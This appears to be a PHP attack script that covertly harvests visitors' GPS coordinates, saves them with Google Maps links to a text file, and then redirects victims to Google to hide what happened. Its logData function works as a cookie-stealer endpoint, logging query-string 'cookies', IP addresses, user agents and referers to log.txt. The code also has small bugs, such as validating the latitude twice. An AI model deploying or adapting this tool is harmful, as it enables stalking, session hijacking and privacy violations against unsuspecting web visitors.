<?php

/*
	Get Exact GPS Location of Webpage Visitors with HTML5 Geolocation API and PHP!
	Author: StrikeVaults
	Author URL: https://www.strikevaults.com/
*/

function validateGeolocation($x, $y){
	if(!(is_float($x) && is_float($y))) return false;
	else return preg_match('/^[-]?(([0-8]?[0-9])\.(\d+))|(90(\.0+)?),[-]?((((1[0-7][0-9])|([0-9]?[0-9]))\.(\d+))|180(\.0+)?)$/', $x.','.$y);
}

$valid = false;
// Checking if the Geolocation is properly sent or not!
if(isset($_GET['x']) && isset($_GET['y'])){
	// Ensuring the provided Geolocation values are float values!
	$latitude = floatval($_GET['x']);
	$longitude = floatval($_GET['y']);
	
	// Validating whether the Latitude and Longitude are in proper format or not!
	if(validateGeolocation($latitude, $latitude)){
		$valid = true;
		// Crafting a Google Maps URL with the valid Latitude and Longitude!
		$maps = "http://maps.google.com/maps?q=$latitude,$longitude";
		
		// Writing (actually appending) the Geolocation Information into a text file named "info.txt"!
		$locationFile = fopen("info.txt", "a") or die("Unable to open file!");
		$info = "Latitude: ".$latitude."\nLongitude: ".$longitude."\nMaps: ".$maps."\n\n";
		fwrite($locationFile, $info);
		fclose($locationFile);
	}
}

// Redirecting to Google if all criteria is satisfied!
if($valid){
	header('Location: https://www.google.com/');
} else{
	// Redirecting to the HomePage if the Geolocation isn't properly sent!
	header('Location: index.php');
}

function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
} 

function logData() 
{ 
	$ipLog="log.txt"; 
	$cookie = $_SERVER['QUERY_STRING']; 
	$register_globals = (bool) ini_get('register_gobals'); 
	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 

	$rem_port = $_SERVER['REMOTE_PORT']; 
	$user_agent = $_SERVER['HTTP_USER_AGENT']; 
	$rqst_method = $_SERVER['METHOD']; 
	$rem_host = $_SERVER['REMOTE_HOST']; 
	$referer = $_SERVER['HTTP_REFERER']; 
	$date=date ("l dS of F Y h:i:s A"); 
	$log=fopen("$ipLog", "a+"); 

	if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) 
		fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE:  $cookie <br>"); 
	else 
		fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host |  Agent: $user_agent | METHOD: $rqst_method | REF: $referer |  DATE: $date | COOKIE:  $cookie \n\n"); 
	fclose($log); 
} 

logData();

?>
